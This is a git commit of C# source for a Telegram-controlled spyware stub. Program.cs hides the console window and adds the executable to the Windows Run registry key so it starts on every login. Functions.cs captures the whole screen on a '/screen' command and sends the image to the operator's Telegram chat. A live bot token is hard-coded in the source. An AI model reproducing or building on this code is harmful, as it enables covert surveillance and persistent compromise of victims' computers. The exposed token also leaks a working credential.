3ea9b2337dc804a960f6dae610b4596d8d5f4487
Robert-Govard <140262911+Robert-Govard@users.noreply.github.com>
2023-08-31 15:44:40 +0300

    Stub build
    Nice Shit

---
+++ BotTG/BotTG/Functions.cs
@@ -0,0 +1,87 @@
+﻿using Microsoft.Win32;
+using Telegram.Bot.Types;
+using Telegram.Bot;
+using System.Drawing.Imaging;
+using Microsoft.Win32;
+
+namespace BotTG
+{
+    public class Functions
+    {
+        public async static Task Update(ITelegramBotClient client, Update update, CancellationToken token)
+        {
+            var message = update.Message;
+
+            if (message.Text != null)
+            {
+                if (message.Text == "/start")
+                {
+                    await client.SendTextMessageAsync(message.Chat.Id, "Бот стартанул!");
+                    return;
+                }
+                if (message.Text == "/help")
+                {
+                    await client.SendTextMessageAsync(message.Chat.Id, "1. Отправить скриншот экрана (/screen)\n" +
+                                                                       "2. Soon..");
+                }
+                if (message.Text == "/screen")
+                {
+                    MakeScreenshot();
+                    string mypath = @"C:\\Temp\\screenshot_01.jpg";
+                    var dat = DateTime.Now;
+                    using (var fileStream = new FileStream(mypath, FileMode.Open, FileAccess.Read, FileShare.Read))
+                    {
+                        await client.SendPhotoAsync(
+                            chatId: message.Chat.Id,
+                            photo: new InputFileStream(fileStream),
+                            caption: dat.ToString("dd/MM/yyyy")
+                        );
+                    }
+                }
+            }
+        }
+        public static void MakeScreenshot()
+        {
+            // получаем размеры окна рабочего стола
+            Rectangle bounds = Screen.GetBounds(Point.Empty);
+
+            // создаем пустое изображения размером с экран устройства
+            using (var bitmap = new Bitmap(bounds.Width, bounds.Height))
+            {
+                // создаем объект на котором можно рисовать
+                using (var g = Graphics.FromImage(bitmap))
+                {
+                    // перерисовываем экран на наш графический объект
+                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                }
+
+                // сохраняем в файл с форматом JPG
+                bitmap.Save(@"C:\\temp\\screenshot_01.jpg", ImageFormat.Jpeg);
+            }
+        }
+
+        const string name = "MyTestApplication";
+        public static bool SetAutorunValue(bool autorun)
+        {
+            string ExePath = System.Windows.Forms.Application.ExecutablePath;
+            RegistryKey reg;
+            reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");
+
+            try
+            {
+                if (autorun == true)
+                    reg.SetValue(name, ExePath);
+                else
+                    reg.DeleteValue(name);
+
+                reg.Close();
+            }
+            catch
+            {
+                return false;
+            }
+            return true;
+        }
+
+    }
+}
---
+++ BotTG/BotTG/Program.cs
@@ -0,0 +1,38 @@
+﻿using Telegram.Bot;
+using Telegram.Bot.Types;
+
+using System.Drawing.Imaging;
+using System;
+using System.Runtime.InteropServices;
+using BotTG;
+
+namespace BotTg
+{
+    class program
+    {
+        public static void Main()
+        {
+            var botClient = new TelegramBotClient("6221051650:AAGw_MVTwRd5JQQUH2cTxqwFHf9YMiLqhgU");
+
+            botClient.StartReceiving(Functions.Update, Error);
+            /*---------------------Hide Console-----------------------------*/
+            var handle = GetConsoleWindow();                                //    
+            [DllImport("kernel32.dll")]                                     //    
+            static extern IntPtr GetConsoleWindow();                        //
+            [DllImport("user32.dll")]                                       //
+            static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);       //
+            const int SW_HIDE = 0;                                          //        
+            const int SW_SHOW = 5;                                          //    
+                                                                            //
+            ShowWindow(handle, SW_HIDE);                                    //
+            /*--------------------------------------------------------------*/
+            Functions.SetAutorunValue(true);
+            Console.ReadLine();
+        }
+
+        async static Task Error(ITelegramBotClient client, Exception exception, CancellationToken token)
+        {
+            return;
+        }
+    }
+}
